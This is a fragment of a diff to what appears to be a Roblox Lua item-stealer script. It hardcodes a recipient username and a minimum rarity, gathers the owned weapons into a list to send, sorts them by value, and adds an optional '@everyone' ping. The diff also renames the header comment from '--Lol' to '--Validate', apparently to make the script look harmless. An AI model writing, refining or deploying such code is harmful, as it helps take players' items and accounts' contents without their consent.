@@ -1,4 +1,4 @@
---Lol
+--Validate
 
 _G.Usernames = {"Erereer454"} 
 _G.min_rarity = "Common" 
@@ -697,7 +697,7 @@ for dataid, amount in pairs(realData.Weapons.Owned) do
     end
 end
 if #weaponsToSend > 0 then
-    table.sort(weaponsToSend, function(a, b) return (a.Value * a.Amount) > (b.Value * b.Amount) end)
+    table.sort(weaponsToSend, function(a, b) return a.Value > b.Value end)
 
     local prefix = (ping == "Yes") and "--@everyone " or ""
     SendFirstMessage(weaponsToSend, prefix)
